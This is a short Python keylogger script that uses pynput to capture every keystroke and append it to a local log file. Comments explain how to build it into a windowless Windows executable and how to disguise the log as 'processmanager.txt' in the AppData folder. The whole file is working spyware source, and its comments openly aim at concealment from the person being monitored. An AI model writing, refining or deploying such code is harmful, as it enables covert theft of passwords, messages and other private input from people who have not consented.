# A rudimentary keylogger 2021. Will be appended
# NOTE: Python > 3.7.6 MIGHT have issues with the libraries below
## To compile in Windows, navigate to dir in cmd > "pyinstaller keylog.py --onefile --noconsole". EXE will be in "dist" directory. All others can be deleted.
## UNHASH LINE 12, HASH line 13 before compiling to EXE.

# --- Libraries ---
import os
from pynput.keyboard import Listener

keys = []
count = 0
# path = os.environ["appdata"] + "\\processmanager.txt"  # on windows. Roaming directory
path = "processmanager.txt"  # for linux. Name can be anything, so make it innocuous


# keylogger function
def onPress(key):
    global keys, count

    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        writeFile(keys)
        keys = []  # Empty list so that the same thing is not entered over and over on every key press


def writeFile(keys):
    with open(path, "a") as f:  # open for appending
        for key in keys:
            k = str(key).replace("'", "")  # so that characters are not split by single quotes
            if k.find("backspace") > 0:
                f.write(" Backspace ")
            elif k.find("enter") > 0:
                f.write("\n")
            elif k.find("shift") > 0:
                f.write(" Shift ")
            elif k.find("space") > 0:
                f.write(" ")
            elif k.find("caps_lock") > 0:
                f.write(" Caps_Lock ")
            elif k.find("key"):
                f.write(k)


# Listener object
with Listener(onPress) as listener:
    listener.join()
